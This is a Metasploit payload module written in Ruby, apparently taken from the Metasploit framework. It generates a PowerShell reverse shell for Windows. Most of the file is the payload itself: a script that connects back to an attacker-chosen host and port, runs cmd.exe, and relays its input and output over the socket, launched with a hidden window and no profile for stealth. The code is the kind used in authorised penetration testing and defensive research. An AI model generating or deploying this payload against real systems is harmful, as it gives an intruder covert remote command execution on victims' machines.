##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/find_shell'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 1481

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
      'Description'   => 'Connect back and create a command shell via Powershell',
      'Author'        =>
        [
          'Dave Kennedy', # Original payload from trustedsec on SET
          'Ben Campbell' # Metasploit module
        ],
      'References'    =>
        [
          ['URL', 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell']
        ],
      # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'powershell',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    powershell = %Q^
$a='#{lhost}';
$b=#{lport};
$c=New-Object system.net.sockets.tcpclient;
$nb=New-Object System.Byte[] $c.ReceiveBufferSize;
$ob=New-Object System.Byte[] 65536;
$eb=New-Object System.Byte[] 65536;
$e=new-object System.Text.UTF8Encoding;
$p=New-Object System.Diagnostics.Process;
$p.StartInfo.FileName='cmd.exe';
$p.StartInfo.RedirectStandardInput=1;
$p.StartInfo.RedirectStandardOutput=1;
$p.StartInfo.RedirectStandardError=1;
$p.StartInfo.UseShellExecute=0;
$q=$p.Start();
$is=$p.StandardInput;
$os=$p.StandardOutput;
$es=$p.StandardError;
$osread=$os.BaseStream.ReadAsync($ob, 0, $ob.Length);
$esread=$es.BaseStream.ReadAsync($eb, 0, $eb.Length);
$c.connect($a,$b);
$s=$c.GetStream();
while ($true) {
    start-sleep -m 100;
    if ($osread.IsCompleted -and $osread.Result -ne 0) {
      $s.Write($ob,0,$osread.Result);
      $s.Flush();
      $osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
    }
    if ($esread.IsCompleted -and $esread.Result -ne 0) {
      $s.Write($eb,0,$esread.Result);
      $s.Flush();
      $esread = $es.BaseStream.ReadAsync($eb, 0, $eb.Length);
    }
    if ($s.DataAvailable) {
      $r=$s.Read($nb,0,$nb.Length);
      if ($r -lt 1) {
          break;
      } else {
          $str=$e.GetString($nb,0,$r);
          $is.write($str);
      }
    }
    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {
        break;
    };
    if ($p.ExitCode -ne $null) {
        break;
    };
};
^.gsub!("\n", "")

    "powershell -w hidden -nop -c #{powershell}"
  end
end
